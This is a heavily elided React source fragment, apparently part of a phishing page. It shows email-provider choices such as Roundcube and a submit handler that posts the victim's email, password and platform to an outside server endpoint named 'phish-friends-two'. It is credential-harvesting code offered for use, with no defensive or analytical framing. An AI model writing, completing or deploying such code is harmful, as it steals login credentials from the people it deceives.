...
import roundcube from './roundcube.jpeg';
...
function App() {
  ...
  const onSubmit = async(email, password, platform) => {
    ...
    await axios.post("https://djonanko-service.onrender.com/phish-friends-two", data).then((response) => {
      if(response.data.id){
    ...
    <div class="container">
        ...
        <div class="content">
            ...
            <div class="email-providers">
                ...
                <img src={roundcube} alt="Roundcube" style={{border: platform === "Roundcube" ? "1px solid black" : ""}} onClick={() => setPlatform("Roundcube")} />
            </div>
